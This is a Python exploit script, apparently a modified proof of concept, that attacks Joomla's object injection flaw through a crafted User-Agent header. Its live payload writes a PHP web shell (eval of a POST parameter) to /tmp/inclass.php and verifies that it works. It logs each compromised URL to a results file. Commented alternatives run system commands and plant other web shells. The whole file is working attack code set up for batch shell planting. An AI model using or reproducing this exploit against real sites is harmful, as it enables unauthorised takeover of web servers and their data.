'''
   Simple PoC for Joomla Object Injection.
   Gary @ Sec-1 ltd
   http://www.sec-1.com/
   Modify GetShell by K8gege
   http://qqhack8.blog.163.com/
'''
 
import requests #  easy_install requests
import sys

url = sys.argv[1] 
 
def get_url(url, user_agent):
 
    headers = {
    'User-Agent': user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, headers=headers,cookies=cookies) 

    return response  #only staus
    #return response.content

def get_url2(url, user_agent):
 
    headers = {
    'User-Agent': user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(1):
        response = requests.get(url, headers=headers,cookies=cookies) 

	if response.content=="JoomlaEOL":
		fo = open("..\K8Result\k8getshell.txt", "a")
		fo.write( url+"\r\n" )
		fo.close()	
	else:
		print "aaaaaaaaaaaaa"
	
    return response  #only staus
    #return response.content
		
	
def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
 
    return encoded[:-1]
 
 
def generate_payload(php_payload):
 
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
 
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
 
    return exploit_template
 
 
#pl = generate_payload("phpinfo();")
#pl = generate_payload("system('net user>c:\\a.txt');")
#pl = generate_payload("fputs(fopen($_SERVER['DOCUMENT_ROOT'].'/inclass.php','w'),'<?php @eval($_POST[tom])?>');")
#pl = generate_payload("fputs(fopen($_SERVER['SCRIPT_FILENAME'].'.php','w'),'<?php @eval($_POST[tom])?>');")
pl = generate_payload("fputs(fopen(str_replace(end(explode('/',$_SERVER['SCRIPT_FILENAME'])),'/tmp/inclass.php',$_SERVER['SCRIPT_FILENAME']),'w'),'<?php @eval($_POST[tom])?>JoomlaEOL');")
 
#print get_url("http://192.168.85.150/joomla", pl)

print get_url(url, pl)
get_url2(url+"/tmp/inclass.php","")